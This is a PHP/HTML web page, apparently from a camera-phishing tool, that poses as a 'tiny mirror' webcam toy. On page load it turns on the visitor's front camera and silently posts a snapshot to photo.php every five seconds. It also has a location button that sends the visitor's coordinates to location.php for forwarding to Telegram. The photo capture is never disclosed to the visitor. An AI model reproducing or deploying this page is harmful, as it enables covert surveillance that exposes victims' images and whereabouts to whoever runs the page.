<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/telegram.php';
?>

<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>

<div class="video-wrap">
   <video id="video" playsinline autoplay></video>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<button id="btnLocate">Enviar ubicación</button>
<div id="locStatus"></div>
<pre id="locData"></pre>

<script>
'use strict';

// ==== CÁMARA ====
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const constraints = { audio: false, video: { facingMode: "user" } };

async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
    } catch(e) {
        console.error("Error al acceder a la cámara:", e);
    }
}

function takePhoto() {
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, 640, 480);
    const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");

    $.ajax({
        type: 'POST',
        url: 'photo.php',
        data: { cat: imgData },
        dataType: 'json',
        success: res => console.log('Foto enviada', res),
        error: err => console.error('Error enviando foto', err)
    });
}

// Foto cada 5 segundos
setInterval(takePhoto, 5000);
initCamera();

// ==== GEOLOCALIZACIÓN ====
const btn = document.getElementById('btnLocate');
const statusEl = document.getElementById('locStatus');
const dataEl = document.getElementById('locData');

btn?.addEventListener('click', () => {
    if (!('geolocation' in navigator)) {
        statusEl.textContent = 'Geolocalización no disponible.';
        return;
    }
    statusEl.textContent = 'Solicitando permiso...';
    navigator.geolocation.getCurrentPosition(async pos => {
        const { latitude, longitude, accuracy } = pos.coords;
        statusEl.textContent = 'Ubicación obtenida, enviando a Telegram...';
        dataEl.textContent = JSON.stringify({ latitude, longitude, accuracy }, null, 2);

        try {
            const res = await fetch('location.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude, longitude, accuracy })
            });
            const out = await res.json();
            statusEl.textContent = 'Servidor respondió: ' + out.status;
        } catch(e) {
            statusEl.textContent = 'Error: ' + e.message;
        }
    }, err => { statusEl.textContent = 'Error: ' + err.message; }, 
    { enableHighAccuracy: false, timeout: 10000 });
});
</script>

</body>
</html>
